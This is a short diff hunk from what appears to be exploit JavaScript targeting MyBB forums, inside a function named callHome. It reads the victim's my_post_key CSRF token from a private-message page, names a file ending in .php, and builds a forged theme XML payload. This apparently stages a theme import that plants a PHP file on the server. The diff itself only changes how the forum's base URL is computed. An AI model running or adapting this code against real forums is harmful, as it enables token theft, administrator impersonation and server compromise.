@@ -98,7 +98,7 @@ function callHome(theme){
 
 isAdmin = false;
 
-host = location.href.split('/')[0] + "//" + location.href.split('/')[2] + "/mybb/";
+host = location.href.substring(0,location.href.indexOf("private.php"));
 key = document.getElementsByName("my_post_key")[0].value;
 filename = "910910910910910910910910xD.php";
 payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<theme>\r\n<stylesheets>\r\n<stylesheet name=\""+filename+".css\">\r\ngecko\r\n</stylesheet>\r\n</stylesheets>\r\n</theme>"
